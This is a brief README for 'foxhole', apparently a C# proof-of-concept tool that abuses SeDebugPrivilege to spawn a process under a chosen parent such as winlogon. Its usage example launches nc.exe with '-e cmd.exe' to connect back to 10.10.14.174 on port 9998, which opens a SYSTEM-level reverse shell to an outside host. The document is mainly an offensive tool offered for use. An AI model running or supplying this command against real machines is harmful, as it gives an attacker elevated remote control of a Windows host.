# foxhole
This C# code creates child process of parent process that you determine (SeDebugPrivelege PoC)
Usage example:
.\sepoc.exe -p winlogon -c "c:\temp\nc.exe 10.10.14.174 9998 -e cmd.exe"
